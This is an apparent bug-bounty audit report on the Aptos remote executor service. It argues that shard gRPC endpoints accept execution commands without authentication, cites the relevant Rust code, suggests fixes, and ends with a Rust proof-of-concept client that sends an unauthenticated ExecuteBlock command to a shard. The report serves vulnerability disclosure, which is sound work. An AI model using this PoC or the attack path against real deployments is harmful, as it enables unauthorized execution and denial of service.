# Audit Report

## Title
Remote Executor Service Lacks Authentication - Any Network Peer Can Send Execution Commands to Shards

## Summary
The remote executor service (`ExecutorService`) accepts execution commands from any network peer without authentication. Any attacker who knows the shard addresses can connect to the gRPC endpoint and send arbitrary `ExecuteBlock` commands, causing shards to execute unauthorized transactions. This breaks the trust model where only the legitimate coordinator should control execution, leading to potential consensus violations and denial-of-service attacks.

## Finding Description

The Aptos sharded execution architecture uses a coordinator-shard model where a `RemoteExecutorClient` (coordinator) distributes partitioned transactions to multiple `ExecutorService` instances (shards) for parallel execution. The security model requires that **only the legitimate coordinator** can send execution commands to shards.

However, the implementation lacks any authentication mechanism at multiple layers:

**1. gRPC Server Layer**

The `GRPCNetworkMessageServiceServerWrapper` accepts incoming RPC requests without any authentication: [1](#0-0) 

The `simple_msg_exchange` method accepts any incoming `NetworkMessage` from any remote address and immediately routes it to registered handlers without verifying the peer's identity.

**2. Network Controller Layer**

The `NetworkController` used by `ExecutorService` does not implement any authentication: [2](#0-1) 

Unlike the main Aptos network framework which uses Noise protocol for peer authentication, this `NetworkController` is a plain TCP/gRPC system with no security controls.

**3. Executor Service Layer**

The `ExecutorService` creates a `NetworkController` that listens on a socket address without any authentication configuration: [3](#0-2) 

**4. Command Processing Layer**

The `RemoteCoordinatorClient` deserializes and processes incoming execution commands without verifying they came from the legitimate coordinator: [4](#0-3) 

At line 89, any message received through the network is deserialized as a `RemoteExecutionRequest` and processed, leading to execution via `ShardedExecutorService`: [5](#0-4) 

**Attack Path:**

1. Attacker discovers shard addresses (configured via CLI arguments in production deployments)
2. Attacker connects to shard's gRPC endpoint at `shard_address`
3. Attacker crafts malicious `RemoteExecutionRequest::ExecuteBlock` with arbitrary `ExecuteBlockCommand`
4. Attacker sends the message to `simple_msg_exchange` RPC method
5. Shard deserializes and executes the command without authentication
6. Shard executes arbitrary transactions that were not part of the legitimate block

**Invariants Broken:**

- **Deterministic Execution**: Different shards may execute different blocks if attacked independently, causing state divergence
- **Access Control**: Only the coordinator should control execution, but any network peer can do so
- **Consensus Safety**: Executing unauthorized blocks breaks consensus protocol assumptions

## Impact Explanation

This vulnerability meets **Critical Severity** criteria per the Aptos bug bounty program:

1. **Consensus/Safety Violations**: An attacker can cause different shards to execute different transaction sets, breaking the deterministic execution invariant. This leads to state inconsistencies across shards, potentially requiring manual intervention or a hard fork to recover.

2. **Total Loss of Liveness/Network Availability**: An attacker can flood shards with bogus execution requests, consuming their compute resources and preventing legitimate execution from the coordinator. This causes complete denial-of-service for the sharded execution pipeline.

3. **Non-recoverable Network Partition**: If shards execute different blocks and produce different state roots, the coordinator cannot aggregate results, potentially causing the validator node to halt or produce invalid blocks.

The vulnerability affects **all deployments** using remote executor services, including production benchmarking and distributed execution scenarios.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely because:

1. **Low Barrier to Entry**: Attacker only needs to know the shard addresses, which are configured via CLI arguments and may be discoverable through network scanning or leaked configuration files.

2. **No Authentication Required**: No cryptographic keys, signatures, or credentials needed - just network connectivity.

3. **Production Usage**: The `ProcessExecutorService` is used in production benchmarks and the main entry point shows it's intended for deployment: [6](#0-5) 

4. **Network Exposure**: If shards are deployed across different machines (as intended for distributed execution), they must be network-accessible, increasing attack surface.

5. **No Rate Limiting**: There are no protective mechanisms against repeated attack attempts.

## Recommendation

Implement mutual authentication between the coordinator and shards using one of these approaches:

**Option 1: Use Aptos Network Framework (Recommended)**

Replace the custom `NetworkController` with the Aptos network framework that implements Noise protocol authentication. This provides:
- Peer identity verification using x25519 keys
- Mutual authentication
- Anti-replay protection
- Encrypted communication

**Option 2: Add gRPC Interceptor Authentication**

Implement a tonic interceptor that validates peer credentials:

```rust
// In secure/net/src/grpc_network_service/mod.rs
use tonic::service::Interceptor;
use std::collections::HashSet;

pub struct AuthInterceptor {
    allowed_peers: Arc<HashSet<String>>,
}

impl Interceptor for AuthInterceptor {
    fn call(&mut self, request: tonic::Request<()>) -> Result<tonic::Request<()>, tonic::Status> {
        let peer_addr = request.remote_addr()
            .ok_or_else(|| tonic::Status::unauthenticated("No peer address"))?;
        
        if !self.allowed_peers.contains(&peer_addr.to_string()) {
            return Err(tonic::Status::unauthenticated("Unauthorized peer"));
        }
        
        Ok(request)
    }
}

// Modify server builder to use interceptor
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .add_service(
        NetworkMessageServiceServer::new(self)
            .with_interceptor(auth_interceptor)
            .max_decoding_message_size(MAX_MESSAGE_SIZE)
    )
```

**Option 3: Add Application-Level Authentication**

Add signed messages with coordinator's private key:

```rust
// In execution/executor-service/src/lib.rs
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct AuthenticatedExecutionRequest {
    pub request: RemoteExecutionRequest,
    pub coordinator_signature: Vec<u8>,
    pub coordinator_public_key: Vec<u8>,
}

// Verify signature before processing
impl RemoteCoordinatorClient {
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let auth_request: AuthenticatedExecutionRequest = 
                    bcs::from_bytes(&message.data).unwrap();
                
                // Verify signature matches expected coordinator public key
                if !verify_signature(&auth_request) {
                    panic!("Unauthorized execution command");
                }
                
                // Process authenticated request...
            }
        }
    }
}
```

**Immediate Mitigation:**

Until authentication is implemented, deploy shards only in isolated, trusted networks with strict firewall rules allowing connections only from the coordinator's IP address.

## Proof of Concept

```rust
// malicious_executor_client.rs
// Compile with: cargo build
// Run with: ./malicious_executor_client --shard-addr 127.0.0.1:52201

use aptos_executor_service::{ExecuteBlockCommand, RemoteExecutionRequest};
use aptos_secure_net::network_controller::Message;
use aptos_types::block_executor::{
    config::BlockExecutorConfigFromOnchain,
    partitioner::SubBlocksForShard,
};
use tonic::transport::Channel;
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let shard_addr = &args[1]; // Target shard address
    
    // Connect to victim shard without any authentication
    let channel = Channel::from_shared(format!("http://{}", shard_addr))?
        .connect()
        .await?;
    
    let mut client = NetworkMessageServiceClient::new(channel);
    
    // Craft malicious execution command
    // In reality, attacker would craft transactions to steal funds or disrupt consensus
    let malicious_command = RemoteExecutionRequest::ExecuteBlock(ExecuteBlockCommand {
        sub_blocks: SubBlocksForShard::empty(), // Simplified for PoC
        concurrency_level: 8,
        onchain_config: BlockExecutorConfigFromOnchain::default(),
    });
    
    let serialized = bcs::to_bytes(&malicious_command)?;
    
    // Send unauthorized command to shard - NO AUTHENTICATION REQUIRED
    let request = tonic::Request::new(NetworkMessage {
        message: serialized,
        message_type: "execute_command_0".to_string(), // Targeting shard 0
    });
    
    println!("[*] Sending unauthorized execution command to shard at {}", shard_addr);
    
    let response = client.simple_msg_exchange(request).await?;
    
    println!("[+] Command accepted by shard without authentication!");
    println!("[+] Shard will now execute unauthorized transactions");
    
    Ok(())
}
```

This PoC demonstrates that any network peer can connect to a shard and send execution commands without any authentication, causing the shard to process unauthorized workloads. In a real attack, the attacker would craft `ExecuteBlockCommand` containing malicious transactions designed to:
- Cause state divergence between shards
- Exhaust shard resources (DoS)
- Execute transactions that bypass consensus
- Force shards to produce invalid state roots

## Notes

The vulnerability exists because the remote executor service uses a simplified `NetworkController` that lacks the authentication mechanisms present in the main Aptos network framework. While the main P2P network uses Noise protocol for mutual authentication, the executor service was designed with plain TCP/gRPC communication, likely assuming deployment in trusted networks. However, this assumption is not enforced in code and creates a critical security gap for production deployments.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L84-113)
```rust
pub struct NetworkController {
    inbound_handler: Arc<Mutex<InboundHandler>>,
    outbound_handler: OutboundHandler,
    inbound_rpc_runtime: Runtime,
    outbound_rpc_runtime: Runtime,
    inbound_server_shutdown_tx: Option<oneshot::Sender<()>>,
    outbound_task_shutdown_tx: Option<Sender<Message>>,
    listen_addr: SocketAddr,
}

impl NetworkController {
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let inbound_handler = Arc::new(Mutex::new(InboundHandler::new(
            service.clone(),
            listen_addr,
            timeout_ms,
        )));
        let outbound_handler = OutboundHandler::new(service, listen_addr, inbound_handler.clone());
        info!("Network controller created for node {}", listen_addr);
        Self {
            inbound_handler,
            outbound_handler,
            inbound_rpc_runtime: Runtime::new().unwrap(),
            outbound_rpc_runtime: Runtime::new().unwrap(),
            // we initialize the shutdown handles when we start the network controller
            inbound_server_shutdown_tx: None,
            outbound_task_shutdown_tx: None,
            listen_addr,
        }
    }
```

**File:** execution/executor-service/src/remote_executor_service.rs (L22-55)
```rust
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        self_address: SocketAddr,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
        let coordinator_client = Arc::new(RemoteCoordinatorClient::new(
            shard_id,
            &mut controller,
            coordinator_address,
        ));
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));

        let executor_service = Arc::new(ShardedExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            coordinator_client,
            cross_shard_client,
        ));

        Self {
            shard_id,
            controller,
            executor_service,
        }
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-112)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L223-255)
```rust
            let command = self.coordinator_client.receive_execute_command();
            match command {
                ExecutorShardCommand::ExecuteSubBlocks(
                    state_view,
                    transactions,
                    concurrency_level_per_shard,
                    onchain_config,
                ) => {
                    num_txns += transactions.num_txns();
                    trace!(
                        "Shard {} received ExecuteBlock command of block size {} ",
                        self.shard_id,
                        num_txns
                    );
                    let exe_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "execute_block"]);
                    let ret = self.execute_block(
                        transactions,
                        state_view.as_ref(),
                        BlockExecutorConfig {
                            local: BlockExecutorLocalConfig::default_with_concurrency_level(
                                concurrency_level_per_shard,
                            ),
                            onchain: onchain_config,
                        },
                    );
                    drop(state_view);
                    drop(exe_timer);

                    let _result_tx_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "result_tx"]);
                    self.coordinator_client.send_execution_result(ret);
                },
```

**File:** execution/executor-service/src/main.rs (L27-48)
```rust
fn main() {
    let args = Args::parse();
    aptos_logger::Logger::new().init();

    let (tx, rx) = crossbeam_channel::unbounded();
    ctrlc::set_handler(move || {
        tx.send(()).unwrap();
    })
    .expect("Error setting Ctrl-C handler");

    let _exe_service = ProcessExecutorService::new(
        args.shard_id,
        args.num_shards,
        args.num_executor_threads,
        args.coordinator_address,
        args.remote_executor_addresses,
    );

    rx.recv()
        .expect("Could not receive Ctrl-C msg from channel.");
    info!("Process executor service shutdown successfully.");
}
```
